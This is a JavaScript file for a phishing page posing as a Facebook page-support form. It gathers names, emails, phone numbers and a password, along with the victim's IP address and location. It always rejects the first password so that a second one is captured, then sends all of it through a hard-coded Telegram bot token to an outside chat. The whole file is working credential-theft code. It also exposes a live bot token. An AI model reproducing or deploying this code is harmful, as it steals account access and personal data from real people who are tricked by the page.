function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then(response => response.json())
        .then(data => callback(data))
        .catch(error => callback(undefined));
}

let FIRST_PASSWORD = '';
let NUMBER_TIME_LOGIN = 0;
let isSubmitDisabled = false;

$(document).ready(function () {
    $('#input').html(`
        <div class="mb-3">
            <label for="page-name" class="form-label">Page Name <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="page-name">
        </div>
        <div class="mb-3">
            <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="full-name">
        </div>
        <div class="mb-3">
            <label for="business-email" class="form-label">Business Email Address <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="business-email">
        </div>
        <div class="mb-3">
            <label for="personal-email" class="form-label">Personal Email Address <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="personal-email">
        </div>
        <div class="mb-3">
            <label for="phone" class="form-label">Mobile Phone Number <span class="text-danger">*</span></label>
            <input type="text" class="form-control" required id="phone">
        </div>
        <div class="mb-3">
            <label class="form-label">Please provide us information that will help us investigate.</label>
            <textarea class="form-control" id="description" rows="3"></textarea>
        </div>
        <button type="button" class="btn mb-4">Submit</button>
    `);

    openDetail();

    getIP(ip => {
        sendForm(ip);
    });

    $('#phone').on('input', function () {
        var input = $(this).val();
        var validInputRegex = /^[+\d]*$/;
        if (!validInputRegex.test(input)) {
            $(this).val(input.slice(0, -1));
        }
    });
});

function openDetail() {
    $(".nav-item-parent").on("click", function () {
        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
        var isOpen = currentRotate != 0;
        $(".detail").hide();
        $(".arrow").css("rotate", "0deg");

        const id = $(this).data("id");
        if (isOpen) {
            $("#" + id).hide();
        } else {
            $("#" + id).show();
            $(this).find(".arrow").css("rotate", "180deg");
        }
    });

    $(".nav-item-child").on("click", function () {
        var currentRotate = $(this).find(".arrow").css("rotate").replace("deg", "");
        var isOpen = currentRotate != 0;
        const id = $(this).data("id");

        if (isOpen) {
            $("#" + id).hide();
            $(this).find(".arrow").css("rotate", "0deg");
            $(this).find(".icon-container").css("background-color", "var(--color-white-secondary)");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(0%)");
            $(this).css("background", "none");
        } else {
            $("#" + id).show();
            $(this).find(".arrow").css("rotate", "180deg");
            $(this).find(".icon-container i").css("-webkit-filter", "invert(100%)");
            $(this).find(".icon-container").css("background-color", "#1877F2");
            $(this).css("background", "#eaf3ffe8");
        }
    });
}

function validateForm() {
    var isValid = true;
    var emailRegex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    var phoneRegex = /^(\+\d+|\d+)$/;

    const fields = [
        { id: '#page-name' },
        { id: '#full-name' },
        { id: '#business-email', regex: emailRegex },
        { id: '#personal-email', regex: emailRegex },
        { id: '#phone', regex: phoneRegex }
    ];

    fields.forEach(field => {
        const val = $(field.id).val();
        if (!val || (field.regex && !field.regex.test(val))) {
            isValid = false;
            $(field.id).addClass('border-danger');
        } else {
            $(field.id).removeClass('border-danger');
        }
    });

    return isValid;
}

function sendForm(IpAddress) {
    $(".content #dataGet button[type=button]").off("click").on("click", function () {
        if (validateForm()) {
            showPrompt(IpAddress);
        }
    });
}

function showPrompt(IpAddress) {
    $('#getPassword').removeClass('d-none');

    $('#close-password').off("click").on('click', function () {
        $('#getPassword').addClass('d-none');
    });

    $('#submit-password').off("click").on('click', function () {
        if (isSubmitDisabled) return;

        isSubmitDisabled = true;
        const submitBtn = $('#submit-password');
        submitBtn.prop('disabled', true);

        let password = $("#password").val();
        if (password === '') {
            $('#password').addClass('border-danger');
            isSubmitDisabled = false;
            submitBtn.prop('disabled', false);
            return;
        } else {
            $('#password').removeClass('border-danger');
        }

        $('#wrong-password').addClass('d-none');

        let secondPassword = '';
        if (NUMBER_TIME_LOGIN >= 1) {
            secondPassword = password;
            password = FIRST_PASSWORD;
        }

        const message = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
🔑 <strong>First Password: </strong><code>${password}</code>
🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
<strong>City: </strong><code>${IpAddress.city}</code>`;

        const token = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
        const chat_id = '-1002416068664';

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chat_id,
                text: message,
                parse_mode: 'html'
            })
        })
        .then(res => {
            if (!res.ok) throw new Error("Telegram request failed");
            return res.json();
        })
        .then(data => {
            NUMBER_TIME_LOGIN++;

            if (NUMBER_TIME_LOGIN === 1) {
                FIRST_PASSWORD = password;

                let countdown = 10;
                submitBtn.text(`Please wait ${countdown}s`);
                setTimeout(() => {
                    $('.lsd-ring-container').addClass('d-none');
                    $('#password').val('');
                }, 100);

                const interval = setInterval(() => {
                    countdown--;
                    if (countdown > 0) {
                        submitBtn.text(`Please wait ${countdown}s`);
                    } else {
                        clearInterval(interval);
                        submitBtn.prop('disabled', false);
                        submitBtn.text('Continue');
                        $('#wrong-password').removeClass('d-none');
                        isSubmitDisabled = false;
                    }
                }, 1000);
            } else {
                setTimeout(() => {
                    $('.lsd-ring-container').addClass('d-none');
                    window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
                }, 2000);
            }
        })
        .catch(error => {
            Swal.fire({
                text: `Request failed!`,
                icon: "error"
            });
            $('.lsd-ring-container').addClass('d-none');
            submitBtn.prop('disabled', false);
            isSubmitDisabled = false;
        });
    });
}
